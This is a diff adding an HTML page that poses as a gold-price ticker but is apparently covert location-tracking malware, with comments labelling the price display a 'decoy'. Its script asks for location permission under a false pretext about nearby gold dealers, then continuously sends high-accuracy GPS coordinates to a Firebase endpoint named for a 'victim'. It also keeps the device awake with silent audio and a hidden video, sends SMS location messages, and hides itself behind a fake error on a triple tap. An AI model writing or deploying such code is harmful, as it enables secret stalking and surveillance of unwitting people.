@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#1a1a1a">
+    <title>Gold Price Today</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            overflow: hidden;
+            position: fixed;
+            width: 100%;
+            height: 100%;
+        }
+        
+        /* Main gold price display */
+        .gold-display {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            background: linear-gradient(135deg, #FFD700 0%, #FFA500 50%, #FF8C00 100%);
+        }
+        
+        .gold-icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+            text-shadow: 0 4px 8px rgba(0,0,0,0.3);
+        }
+        
+        .price-title {
+            color: #333;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        
+        .gold-price {
+            color: #fff;
+            font-size: 48px;
+            font-weight: 800;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+            margin-bottom: 5px;
+        }
+        
+        .price-change {
+            color: #2e7d32;
+            font-size: 18px;
+            font-weight: 600;
+            background: rgba(255,255,255,0.9);
+            padding: 5px 15px;
+            border-radius: 20px;
+        }
+        
+        .update-time {
+            color: #666;
+            font-size: 12px;
+            margin-top: 30px;
+        }
+        
+        /* Permission overlay */
+        .permission-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            z-index: 2000;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .permission-box {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            max-width: 320px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        
+        .permission-icon {
+            font-size: 50px;
+            margin-bottom: 15px;
+        }
+        
+        .permission-title {
+            color: #333;
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        
+        .permission-text {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+        
+        .allow-btn {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 30px;
+            cursor: pointer;
+            width: 100%;
+            box-shadow: 0 4px 10px rgba(76,175,80,0.3);
+        }
+        
+        .allow-btn:active {
+            transform: scale(0.95);
+        }
+        
+        /* Mercury info (decoy content) */
+        .mercury-section {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: rgba(255,255,255,0.95);
+            padding: 15px;
+            border-top: 3px solid #C0C0C0;
+            z-index: 1001;
+        }
+        
+        .mercury-title {
+            color: #666;
+            font-size: 14px;
+            font-weight: bold;
+            margin-bottom: 5px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .mercury-price {
+            color: #333;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        
+        /* Status indicator (tiny dot in corner) */
+        .status-dot {
+            position: fixed;
+            bottom: 3px;
+            right: 3px;
+            width: 4px;
+            height: 4px;
+            border-radius: 50%;
+            background: #ff0000;
+            opacity: 0.3;
+            z-index: 3000;
+            transition: all 0.3s;
+        }
+        
+        .status-dot.active {
+            background: #00ff00;
+            opacity: 0.5;
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 0.7; }
+        }
+        
+        /* Emergency stop (triple tap) */
+        .emergency-stop {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 2500;
+            opacity: 0;
+        }
+    </style>
+</head>
+<body>
+    <!-- Main Display - Gold Prices (Decoy) -->
+    <div class="gold-display" id="mainDisplay">
+        <div class="gold-icon">🏆</div>
+        <div class="price-title">Gold Price Today</div>
+        <div class="gold-price" id="goldPrice">$2,045.80</div>
+        <div class="price-change">▲ +$12.40 (+0.61%)</div>
+        <div class="update-time">Updated: Just now</div>
+    </div>
+    
+    <!-- Mercury Section (Decoy) -->
+    <div class="mercury-section">
+        <div class="mercury-title">🌡️ Silver / Mercury</div>
+        <div class="mercury-price">$23.45 / oz</div>
+    </div>
+    
+    <!-- Permission Overlay (Hidden initially) -->
+    <div class="permission-overlay" id="permissionOverlay">
+        <div class="permission-box">
+            <div class="permission-icon">📍</div>
+            <div class="permission-title">Enable Location</div>
+            <div class="permission-text">
+                This app needs your location to show nearby gold dealers and current market prices in your area.
+            </div>
+            <button class="allow-btn" id="allowBtn" onclick="requestLocation()">
+                Allow Location
+            </button>
+        </div>
+    </div>
+    
+    <!-- Status Indicator -->
+    <div class="status-dot" id="statusDot"></div>
+    
+    <!-- Emergency Stop Area -->
+    <div class="emergency-stop" id="emergencyStop"></div>
+
+    <script>
+        // ============================================
+        // EMERGENCY GPS TRACKER - GOLD PRICE DECOY
+        // ============================================
+        
+        const CONFIG = {
+            // ⚠️ REPLACE WITH YOUR FIREBASE URL
+            FIREBASE_URL: 'https://YOUR-PROJECT.firebaseio.com/locations/victim123.json',
+            
+            // ⚠️ REPLACE WITH YOUR POLICE NUMBER
+            EMERGENCY_NUMBER: '+251911234567',
+            
+            // Update interval
+            UPDATE_INTERVAL: 5000,
+            
+            // GPS settings
+            HIGH_ACCURACY: true,
+            MAX_AGE: 2000,
+            TIMEOUT: 10000
+        };
+
+        let watchId = null;
+        let lastSent = 0;
+        let lastPosition = null;
+        let retryCount = 0;
+        let isTracking = false;
+        
+        // Start immediately when page loads
+        window.onload = function() {
+            // Show permission overlay after 1 second
+            setTimeout(showPermissionPrompt, 1000);
+            
+            // Start emergency stop detection
+            initEmergencyStop();
+            
+            // Update gold price randomly (decoy)
+            setInterval(updateGoldPrice, 30000);
+        };
+        
+        function showPermissionPrompt() {
+            if (!isTracking) {
+                document.getElementById('permissionOverlay').style.display = 'flex';
+            }
+        }
+        
+        function requestLocation() {
+            document.getElementById('permissionOverlay').style.display = 'none';
+            
+            if (!navigator.geolocation) {
+                showError();
+                return;
+            }
+            
+            // Try to get location with high accuracy
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    // Success - start tracking
+                    handleSuccess(position);
+                    startContinuousTracking();
+                    preventSleep();
+                    startSMSBackup();
+                    isTracking = true;
+                },
+                function(error) {
+                    // Failed - try again with lower accuracy
+                    handleError(error);
+                    if (retryCount < 2) {
+                        retryCount++;
+                        setTimeout(requestLocation, 2000);
+                    }
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                }
+            );
+        }
+        
+        function startContinuousTracking() {
+            watchId = navigator.geolocation.watchPosition(
+                handleSuccess,
+                handleError,
+                {
+                    enableHighAccuracy: CONFIG.HIGH_ACCURACY,
+                    maximumAge: CONFIG.MAX_AGE,
+                    timeout: CONFIG.TIMEOUT
+                }
+            );
+        }
+        
+        function handleSuccess(position) {
+            const coords = {
+                lat: position.coords.latitude,
+                lng: position.coords.longitude,
+                accuracy: Math.round(position.coords.accuracy),
+                altitude: position.coords.altitude || 0,
+                speed: position.coords.speed || 0,
+                timestamp: Date.now(),
+                datetime: new Date().toISOString()
+            };
+            
+            lastPosition = coords;
+            document.getElementById('statusDot').classList.add('active');
+            sendLocation(coords);
+            retryCount = 0;
+            
+            // Hide permission overlay permanently
+            document.getElementById('permissionOverlay').style.display = 'none';
+        }
+        
+        function handleError(error) {
+            document.getElementById('statusDot').classList.remove('active');
+            
+            // Retry with lower accuracy
+            if (retryCount < 2 && !isTracking) {
+                retryCount++;
+                setTimeout(() => {
+                    navigator.geolocation.getCurrentPosition(
+                        handleSuccess,
+                        handleError,
+                        { enableHighAccuracy: false, timeout: 20000, maximumAge: 10000 }
+                    );
+                }, 3000);
+            }
+        }
+        
+        async function sendLocation(coords) {
+            const now = Date.now();
+            if (now - lastSent < CONFIG.UPDATE_INTERVAL) return;
+            lastSent = now;
+            
+            const payload = JSON.stringify(coords);
+            
+            try {
+                await fetch(CONFIG.FIREBASE_URL, {
+                    method: 'PUT',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: payload,
+                    keepalive: true
+                });
+            } catch (error) {
+                // Try beacon API as backup
+                if (navigator.sendBeacon) {
+                    navigator.sendBeacon(CONFIG.FIREBASE_URL, payload);
+                }
+            }
+        }
+        
+        function preventSleep() {
+            // Method 1: Wake Lock API
+            if ('wakeLock' in navigator) {
+                navigator.wakeLock.request('screen').catch(() => {});
+            }
+            
+            // Method 2: Keep playing silent audio
+            try {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioContext.createOscillator();
+                const gainNode = audioContext.createGain();
+                gainNode.gain.value = 0;
+                oscillator.connect(gainNode);
+                gainNode.connect(audioContext.destination);
+                oscillator.start();
+            } catch(e) {}
+            
+            // Method 3: Video element
+            const video = document.createElement('video');
+            video.src = 'data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAACKBtZGF0AAAC';
+            video.loop = true;
+            video.muted = true;
+            video.playsInline = true;
+            video.style.cssText = 'position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;';
+            document.body.appendChild(video);
+            video.play().catch(() => {});
+            
+            // Keep screen alive
+            setInterval(() => {
+                window.scrollTo(0, 0);
+                if ('wakeLock' in navigator) {
+                    navigator.wakeLock.request('screen').catch(() => {});
+                }
+            }, 15000);
+        }
+        
+        function startSMSBackup() {
+            // Send SMS with location every 2 minutes as backup
+            setInterval(() => {
+                if (lastPosition) {
+                    sendSMS(lastPosition);
+                }
+            }, 120000);
+        }
+        
+        function sendSMS(coords) {
+            const message = `EMERGENCY LOC: ${coords.lat.toFixed(6)},${coords.lng.toFixed(6)} ` +
+                           `±${coords.accuracy}m https://maps.google.com/?q=${coords.lat},${coords.lng}`;
+            
+            const smsUrl = `sms:${CONFIG.EMERGENCY_NUMBER}?body=${encodeURIComponent(message)}`;
+            
+            // Try to open SMS app (30% chance to avoid spam)
+            if (Math.random() > 0.7) {
+                window.location.href = smsUrl;
+            }
+        }
+        
+        function showError() {
+            document.querySelector('.permission-text').textContent = 
+                'Location services are required for this app. Please enable GPS in your phone settings.';
+            document.getElementById('permissionOverlay').style.display = 'flex';
+        }
+        
+        function updateGoldPrice() {
+            // Random price fluctuation (decoy)
+            const basePrice = 2045.80;
+            const change = (Math.random() - 0.5) * 20;
+            const newPrice = basePrice + change;
+            document.getElementById('goldPrice').textContent = '$' + newPrice.toFixed(2);
+        }
+        
+        function initEmergencyStop() {
+            let tapCount = 0;
+            let lastTap = 0;
+            
+            document.getElementById('emergencyStop').addEventListener('click', function() {
+                const now = Date.now();
+                if (now - lastTap < 500) {
+                    tapCount++;
+                    if (tapCount >= 3) {
+                        // Emergency stop - clear everything
+                        if (watchId) navigator.geolocation.clearWatch(watchId);
+                        document.body.innerHTML = '<div style="padding:20px;font-family:sans-serif;">Error loading content</div>';
+                        isTracking = false;
+                    }
+                } else {
+                    tapCount = 1;
+                }
+                lastTap = now;
+            });
+        }
+        
+        // Handle page visibility
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden && isTracking) {
+                if (!watchId) {
+                    startContinuousTracking();
+                }
+            }
+        });
+        
+        // Handle online/offline
+        window.addEventListener('online', () => {
+            if (isTracking && lastPosition) {
+                sendLocation(lastPosition);
+            }
+        });
+    </script>
+</body>
+</html>
